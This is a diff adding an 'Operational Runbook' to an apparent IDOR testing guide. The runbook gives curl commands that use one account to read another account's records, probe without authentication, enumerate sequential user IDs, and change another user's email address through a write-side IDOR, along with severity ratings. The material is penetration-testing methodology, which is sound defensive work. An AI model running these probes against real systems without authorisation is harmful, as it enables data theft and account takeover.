@@ -164,6 +164,111 @@ query IDOR {
 - IDOR + SSRF: exfiltrate internal IDs, then access their corresponding resources
 - IDOR + Race: bypass spot checks with simultaneous requests
 
+## Operational Runbook
+
+Once a likely IDOR surface is identified (numeric ID in path, predictable UUID, sequential token), this is the canonical confirmation flow. Two principals minimum: `OWNER` (knows their own ID), `ATTACKER` (different account, no claim to OWNER's resource).
+
+### Step 1 — capture both sessions
+
+```bash
+# OWNER login (capture session/JWT)
+OWNER_AUTH=$(curl -s -X POST '<TARGET>/api/login' \
+    -d '{"email":"owner@x","password":"..."}' -H 'Content-Type: application/json' \
+    | jq -r '.token')
+
+# ATTACKER login (different account)
+ATK_AUTH=$(curl -s -X POST '<TARGET>/api/login' \
+    -d '{"email":"attacker@x","password":"..."}' -H 'Content-Type: application/json' \
+    | jq -r '.token')
+
+# Capture OWNER's resource ID (e.g. via /me endpoint)
+OWNER_ID=$(curl -s '<TARGET>/api/me' -H "Authorization: Bearer $OWNER_AUTH" | jq -r '.id')
+```
+
+### Step 2 — cross-session read
+
+```bash
+# Baseline: ATTACKER reads ATTACKER's own resource (should succeed)
+curl -s "<TARGET>/api/users/$ATK_ID" -H "Authorization: Bearer $ATK_AUTH" \
+    -w '\n=== status: %{http_code} ===\n'
+
+# Probe: ATTACKER reads OWNER's resource (should be 403/404; if 200 → IDOR)
+curl -s "<TARGET>/api/users/$OWNER_ID" -H "Authorization: Bearer $ATK_AUTH" \
+    -w '\n=== status: %{http_code} ===\n' -o /tmp/idor_probe.json
+
+# Compare against OWNER's view of the same resource
+diff <(curl -s "<TARGET>/api/users/$OWNER_ID" -H "Authorization: Bearer $OWNER_AUTH") /tmp/idor_probe.json
+```
+
+Same response body → confirmed IDOR. Different but populated → partial leak. 403/404 → no IDOR on this surface.
+
+### Step 3 — anon variant (CWE-862 missing-auth)
+
+Run the same probe with no auth header — if the response still includes the resource, the endpoint is **completely unauthenticated**, which is worse than IDOR (anyone on the internet can read it):
+
+```bash
+curl -s "<TARGET>/api/users/$OWNER_ID" -w '\n=== anon: %{http_code} ===\n'
+```
+
+### Step 4 — enumerate the ID space
+
+```bash
+# Sequential int IDs
+for id in $(seq 1 50); do
+  resp=$(curl -s "<TARGET>/api/users/$id" -H "Authorization: Bearer $ATK_AUTH" \
+    -w '\n%{http_code}\n')
+  status=$(echo "$resp" | tail -1)
+  if [[ "$status" == "200" ]]; then
+    echo "id=$id leaked"
+  fi
+done
+
+# UUID space — try guessing v1 (timestamp-prefixed) or attacking the predictability
+# of the generator (look for sequential pieces in the high-order bits of multiple UUIDs)
+```
+
+### Step 5 — write-side IDOR (most damaging)
+
+If the read works, also test the write:
+
+```bash
+# Can ATTACKER change OWNER's email?
+curl -s -X PATCH "<TARGET>/api/users/$OWNER_ID" \
+    -H "Authorization: Bearer $ATK_AUTH" -H 'Content-Type: application/json' \
+    -d '{"email":"attacker-controlled@x"}' \
+    -w '\n=== write: %{http_code} ===\n'
+```
+
+A successful write-side IDOR is **critical** — full account takeover via password-reset flow.
+
+### Step 6 — IDOR via parameter / body shape
+
+Not all IDORs are in path segments. Also probe:
+
+```bash
+# Hidden in body — server uses body.user_id, not session
+curl -s -X POST '<TARGET>/api/messages' \
+    -H "Authorization: Bearer $ATK_AUTH" \
+    -d "{\"recipient_id\":$OWNER_ID,\"text\":\"x\"}"
+
+# Hidden in query string
+curl -s "<TARGET>/api/orders?user_id=$OWNER_ID" -H "Authorization: Bearer $ATK_AUTH"
+
+# Hidden in custom header
+curl -s '<TARGET>/api/profile' -H "Authorization: Bearer $ATK_AUTH" \
+    -H "X-User-Id: $OWNER_ID"
+```
+
+### Step 7 — record evidence + mark severity
+
+Severity rules:
+- Read-only IDOR on PII → **high**
+- Read-only IDOR with `is_admin` / `role` in response → **critical** (privilege gradient)
+- Write-side IDOR → **critical**
+- Missing-auth (CWE-862, anon read works) → **critical**
+
+Document: baseline (OWNER reading own), probe (ATTACKER reading OWNER's, expected vs actual), enumeration sample (3-5 IDs leaked), and the response-body diff for evidence.
+
 ## Testing Methodology
 
 1. **Build matrix** - Subject × Object × Action matrix (who can do what to which resource)
